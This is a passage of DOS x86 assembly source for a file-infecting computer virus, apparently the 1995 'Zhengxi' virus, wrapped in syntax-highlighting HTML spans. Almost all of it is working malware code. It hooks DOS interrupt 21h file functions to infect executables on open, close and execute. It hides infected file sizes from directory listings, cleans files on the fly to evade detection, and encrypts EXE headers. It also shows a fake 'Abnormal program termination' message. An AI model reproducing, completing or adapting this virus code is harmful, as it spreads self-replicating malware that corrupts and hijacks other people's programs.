       </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_____</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">zmeflIXE</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
          </span><span class="sc6">retf</span><span class="sc0">
       </span><span class="sc5">DONE</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_____</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">zmeflEXE</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;-?</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">carrier</span><span class="sc0">                       </span><span class="sc1">;/</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">vir_heap._after_goto</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">goto_exe</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">user_proc</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">goto_EXE</span><span class="sc0"> </span><span class="sc1">;api</span><span class="sc0">
</span><span class="sc1">;(ss-es-0x17)&lt;&lt;4+sp</span><span class="sc0">
</span><span class="sc1">;ss=cs-1</span><span class="sc0">
</span><span class="sc1">;(cs-es-0x18)&lt;&lt;4+sp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;psp</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">save_SP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Eh</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt_exe_header_custom</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc5">movseg</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[(</span><span class="sc5">heap</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc5">.exe_SS</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[(</span><span class="sc5">heap</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc5">.exe_CS</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[(</span><span class="sc5">heap</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc5">.exe_SS</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[(</span><span class="sc5">heap</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc5">.exe_SP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[(</span><span class="sc5">heap</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc5">.exe_IP</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">carrier</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">endmsg</span><span class="sc0">
</span><span class="sc1">;    db 'This program requires Microsoft Windows.'</span><span class="sc0">
</span><span class="sc1">; db 'The Application Program Interface (API) entered'</span><span class="sc0">
</span><span class="sc1">; db 'will only work in OS/2 mode.'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Abnormal program termination'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">
</span><span class="sc1">;public_key dd ?</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc12">'The Virus/DOS 0.54  Copyright (c) 1995 Zhengxi Ltd'</span><span class="sc0">
</span><span class="sc1">;    db CRLF,'Don''t distribute this program!',CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc12">'Warning! This program for internal use only!'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">

</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">endmsg</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc5">movseg</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc9">.exit</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc1">;funcs21 equ    &lt;00,11,12,31,3D,3E,3F,41,42,48,49,4A,4B,4C,4E,4F,67,6C&gt; ;</span><span class="sc0">
</span><span class="sc5">funcs21</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc2">67</span><span class="sc4">,</span><span class="sc2">3E</span><span class="sc4">,</span><span class="sc2">6C</span><span class="sc4">,</span><span class="sc2">3F</span><span class="sc4">,</span><span class="sc2">49</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">3D</span><span class="sc4">,</span><span class="sc2">41</span><span class="sc4">,</span><span class="sc2">4A</span><span class="sc4">,</span><span class="sc2">11</span><span class="sc4">,</span><span class="sc2">4B</span><span class="sc4">,</span><span class="sc2">31</span><span class="sc4">,</span><span class="sc2">48</span><span class="sc4">,</span><span class="sc2">4C</span><span class="sc4">,</span><span class="sc2">4E</span><span class="sc4">,</span><span class="sc2">42</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">,</span><span class="sc2">4F</span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">functions</span><span class="sc0">
</span><span class="sc5">%</span><span class="sc0"> </span><span class="sc9">IRP</span><span class="sc0"> </span><span class="sc5">foo</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">funcs21</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">(&amp;</span><span class="sc5">foo</span><span class="sc4">&amp;</span><span class="sc5">h</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">&amp;</span><span class="sc5">foo</span><span class="sc4">&amp;</span><span class="sc5">h</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc5">funcnt</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">functions</span><span class="sc0">

</span><span class="sc5">MROR</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">w1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">shval</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">w1</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">shval</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc4">))</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">w1</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">10h</span><span class="sc4">-(</span><span class="sc5">shval</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc4">)))</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc5">MROL</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">w1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">shval</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">w1</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">shval</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc4">))</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">w1</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">10h</span><span class="sc4">-(</span><span class="sc5">shval</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc4">)))</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc5">%</span><span class="sc0"> </span><span class="sc9">IRP</span><span class="sc0"> </span><span class="sc5">foo</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">funcs21</span><span class="sc0">
    </span><span class="sc5">MROR</span><span class="sc0"> </span><span class="sc4">&lt;((</span><span class="sc5">bfr_</span><span class="sc4">&amp;</span><span class="sc5">foo</span><span class="sc4">-</span><span class="sc5">virus_zero</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">virus_zero</span><span class="sc4">))&gt;,</span><span class="sc0"> </span><span class="sc4">&lt;(</span><span class="sc5">bfr_aft</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">)&gt;</span><span class="sc0">
    </span><span class="sc5">MROL</span><span class="sc0"> </span><span class="sc4">&lt;((</span><span class="sc5">aft_</span><span class="sc4">&amp;</span><span class="sc5">foo</span><span class="sc4">-</span><span class="sc5">virus_zero</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">virus_zero</span><span class="sc4">))&gt;,</span><span class="sc0"> </span><span class="sc4">&lt;(</span><span class="sc5">bfr_aft</span><span class="sc4">-(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">))&gt;</span><span class="sc0">
    </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">bfr_</span><span class="sc4">&amp;</span><span class="sc5">foo</span><span class="sc0">
    </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">aft_</span><span class="sc4">&amp;</span><span class="sc5">foo</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc5">bfr_aft</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">user_proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">vir_heap._save_ss</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">vir_heap._save_sp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
    </span><span class="sc5">movseg</span><span class="sc0">  </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">end_stack</span><span class="sc0">
    </span><span class="sc6">pushf</span><span class="sc0">
    </span><span class="sc6">cli</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">pushaw</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_heap</span><span class="sc4">+</span><span class="sc2">80H</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">after_goto</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">rt_err</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">begin_stack</span><span class="sc0"> </span><span class="sc1">;end_stack-20d</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">popaw</span><span class="sc0">
    </span><span class="sc6">popf</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">vir_heap._save_ss</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">vir_heap._save_sp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">RANDOMIZE</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">begin_auto</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">end_auto</span><span class="sc4">-</span><span class="sc5">begin_auto</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+(</span><span class="sc5">public_key</span><span class="sc4">-</span><span class="sc5">begin_auto</span><span class="sc4">)</span><span class="sc5">.lo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+(</span><span class="sc5">public_key</span><span class="sc4">-</span><span class="sc5">begin_auto</span><span class="sc4">)</span><span class="sc5">.hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Calculate_CRC</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">r_lo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">r_hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">

</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">end_auto</span><span class="sc0">

</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">

</span><span class="sc5">bfr_3E</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">BE</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">InfectHandle</span><span class="sc0">
</span><span class="sc5">aft_3E</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;ret</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">InfectName</span><span class="sc0">

</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">bfr_41</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">Doctor_Name</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D12h</span><span class="sc0">
    </span><span class="sc5">ifInfJump</span><span class="sc0">   </span><span class="sc5">NameCustom</span><span class="sc0">
    </span><span class="sc5">movseg</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">restore_header</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosseek</span><span class="sc0">        </span><span class="sc1">;seek</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosTruncate</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_exehdr</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">dosclose</span><span class="sc0">
</span><span class="sc1">;Doctor_Name endp</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">

</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">aft_11</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">aft_12</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">movseg</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">$ret</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2fh</span><span class="sc0">      </span><span class="sc1">; get DTA</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;really not need,</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">test_size</span><span class="sc0"> </span><span class="sc1">;ZF=0 - no infected file  ;speed optimization</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">$ret</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">StealthName</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11d</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc9">NE</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">LU</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">stlts_find_name</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">

</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">bfr_6C</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">;no open</span><span class="sc0">
    </span><span class="sc5">PASS</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">   </span><span class="sc1">;r/0</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Doctor_Name</span><span class="sc0">
